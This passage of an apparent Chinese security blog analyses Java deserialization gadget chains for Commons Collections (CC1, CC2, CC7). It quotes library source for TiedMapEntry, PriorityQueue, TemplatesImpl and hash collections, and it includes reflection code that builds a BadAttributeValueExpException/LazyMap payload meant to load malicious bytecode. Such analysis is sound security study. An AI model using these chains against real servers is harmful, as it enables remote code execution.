class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">other</span> <span class="operator">=</span> (Entry)obj;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">this</span>.key == <span class="literal">null</span> ? other.getKey() == <span class="literal">null</span> : <span class="built_in">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="literal">null</span> ? other.getValue() == <span class="literal">null</span> : value.equals(other.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//调用了this.getValue()-&gt;this.map.get</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>三个方法都可以调用到this.map.get，如果我们将this.map指向LazyMap即可完成调用链</p>
<h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                                  <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// compare函数，无判断条件直接调用transform</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当然他是一个比较器，当我们能触发他的compare方法就可以完成transform调用</p>
<p>在CC2中，他也是被作为一个比较器放在优先队列的构造方法里的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br></pre></td></tr></table></figure>

<h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>java.util.PriorityQueue</p>
<p>构造方法之一：</p>
<p>可以自定义它的比较器，一般就是上一个<code>TransformingComparator</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                     Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">    <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">    <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">    <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>readObject方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里经过一系列内部调用</p>
<p><code>readObject&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;comparator.compare(x, e)-&gt;TransformingComparator.compare(e)-&gt;transformer.transform(e))</code></p>
<p>一般最后会调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类来执行恶意代码</p>
<p>详细见CC2中的分析</p>
<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
<p>ysoserial中最最常见：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>


<p>关注其中的几个核心方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心方法1 newTransformer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">                                      _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第六行的getTransletInstance()，跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//核心方法2 getTransletInstance</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>当<code>_name</code>和<code>_class</code>都为null的时候，调用用defineTransletClasses()，然后实例化一个新对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 核心方法3，defineTransletClasses，根据字节码，创建类对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123; <span class="comment">// 这里如果_bytecodes==null，程序直接报错，所以不能为null</span></span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取classLoader，用于后面加载类的字节码</span></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)  AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建常量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            <span class="comment">// 循环使用defineClass加载类字节码，返回类对象</span></span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="comment">// 省略后的代码，后面基本不用看了，因为没有对__class数组产生影响，返回前面的getTransletInstance函数中        </span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>() &#123; <span class="comment">//异常处理，省略 &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过defineClass可以加载我们的恶意字节码！</p>
<p>关于这个类可以说的很多，详细见之前的分析。</p>
<h1 id="枪口——实现readObject方法的类"><a href="#枪口——实现readObject方法的类" class="headerlink" title="枪口——实现readObject方法的类"></a>枪口——实现readObject方法的类</h1><h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><p>javax.management.BadAttributeValueExpException</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>val = valObj.toString();</code>中调用了toString方法。</p>
<p>我们将valObj指向TiedMapEntry即可完成调用。valObj也就是val这个成员变量，因此可以这样构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 省略chainedTransformer创建的过程，直接从前面拿过来就可以了</span></span><br><span class="line">HashMap&lt;String, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">expException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">// 反射修改val</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> expException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    val.set(expException, tiedMapEntry);</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;e.printStackTrace();&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PriorityQueue-1"><a href="#PriorityQueue-1" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>java.util.PriorityQueue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面分析过，heapify方法会连接起后面的调用链</p>
<p>CC2中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readObject&gt;heapify-&gt;siftDown-&gt;siftDownUsingComparator-&gt;comparator.compare(x, e)-&gt;</span><br><span class="line">	TransformingComparator.compare(e)-&gt;transformer.transform(e))-&gt;invokerTransformer.transform(e)-&gt;</span><br><span class="line">		TemplatesImpl.newTransform-&gt;TemplatesImpl.getTransletInstance-&gt;_class[_transletIndex].newInstance()</span><br></pre></td></tr></table></figure>

<p>如果想用transformerMap只需要把transformer处改成ChainedTransformer的实例即可</p>
<p>即替换掉上面的第三行即可</p>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set other fields that need values</span></span><br><span class="line">    table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in number of buckets</span></span><br><span class="line">    s.readInt(); <span class="comment">// ignored.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read number of mappings</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// capacity chosen by number of mappings and desired load (if &gt;= 0.25)</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">                mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                <span class="comment">// we have limits...</span></span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allocate the bucket array;</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        inflateTable(capacity);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        threshold = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putForCreate(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进：putForCreate方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">putForCreate</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="literal">null</span> == key ? <span class="number">0</span> : hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>跟进：hash方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>k.hashCode()</code>，如果把key设置为TiedMapEntry的实例，直接就把利用链构造出来了</p>
<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in size</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>map.put(e, PRESENT)</code></p>
<p>这个利用链和前面的HashMap利用链接上了，<code>map.put(e, PRESENT)=HashMap.put(e, PRESENT)-&gt;HashMap.hash(e)-&gt;e.hashCode()</code></p>
<p>所以只需要把tiedMapEntry放进HashSet即可完成利用链的构造</p>
<h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(newTable, key, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>CC7里的，跟进reconstitutionPut方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键调用了<code>e.key.equals(key)</code>，这里可以和TiedMapEntry联系起来，详细见cc7</p>
<h2 id="HashTable2"><a href="#HashTable2" class="headerlink" title="HashTable2"></a>HashTable2</h2><p>同样reconstitutionPut方法方法中有hash()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="comment">// hashSeed will be zero if alternative hashing is disabled.</span></span><br><span class="line">    <span class="keyword">return</span> hashSeed ^ k.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里也可以通过TiedMapEntry来连接</p>
<h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>sun.reflect.annotation.AnnotationInvocationHandler</p>
<p>可以看CC1【2】中对其的分析，以及对<code>Gadgets.createMemoitizedProxy(lazyMap, Map.class)</code>方法的分析</p>
<p><a href="https://xianbei.top/2022/03/15/cc1study2/#title-6">https://xianbei.top/2022/03/15/cc1study2/#title-6</a></p>
<h1 id="参考-amp-好文mark"><a href="#参考-amp-好文mark" class="headerlink" title="参考&amp;好文mark"></a>参考&amp;好文mark</h1><p><a href="https://www.cnblogs.com/bitterz/p/15035581.html">https://www.cnblogs.com/bitterz/p/15035581.html</a></p>
<p><a href="https://xz.aliyun.com/t/8164">https://xz.aliyun.com/t/8164</a></p>
<p><a href="https://xz.aliyun.com/t/9451">https://xz.aliyun.com/t/9451</a></p>
<p>下面这个一定要看，不看后悔一辈子</p>
<p><a href="http://www.whrizyl819.xyz/">http://www.whrizyl819.xyz/</a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn2021-ezj4va题解</title>
    <url>/2022/05/29/ciscn2021-ezj4va/</url>
    <content><![CDATA[<p>参考文章：</p>
<p><a href="https://forum.butian.net/share/337">https://forum.butian.net/share/337</a></p>
<p><a href="https://www.anquanke.com/post/id/249651">https://www.anquanke.com/post/id/249651</a></p>
